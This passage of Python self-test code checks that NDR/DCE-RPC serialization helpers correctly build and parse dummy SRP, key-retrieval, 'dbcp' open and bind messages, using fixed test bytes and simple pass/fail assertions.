    hsrp = struct.pack("<I", 0) + uuid_to_bytes("1e2d3c4b-5a69-7887-96a5-b4c3d2e1f009")
    w = NdrWriter()
    write_container_out(w, bytes(range(32)))
    write_container_out(w, bytes([9, 8, 7]))
    write_container_out(w, b"SHA-256")
    w.ctx_handle(hsrp)
    w.i32(0)
    resp = parse_srp_new_response(w.bytes())
    _st(resp["hSrp"] == hsrp and resp["ret"] == 0, "opnum0 resp", failures)
    w2 = NdrWriter()
    write_container_out(w2, bytes(range(32)))
    w2.i32(0)
    kresp = parse_getkey_response(w2.bytes())
    _st(kresp["key"] == bytes(range(32)), "opnum1 resp", failures)

    dstub = build_dbcp_open_request(DEFAULT_DBCP_PATH)
    c3 = NdrCursor(dstub)
    _st(
        c3.wchar_string_ref() == DEFAULT_DBCP_PATH and c3.ctx_handle() == NULL_HANDLE and c3.eof(),
        "dbcp open",
        failures,
    )

    bind = build_bind(1, [ctx_srp(0), ctx_dbcp(1)])
    _st(bind[2] == PTYPE_BIND and bind[:2] == b"\x05\x00", "bind pdu", failures)

    if failures and __name__ == "__main__":
        for f in failures:
            print("FAIL:", f)
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(run_selftest())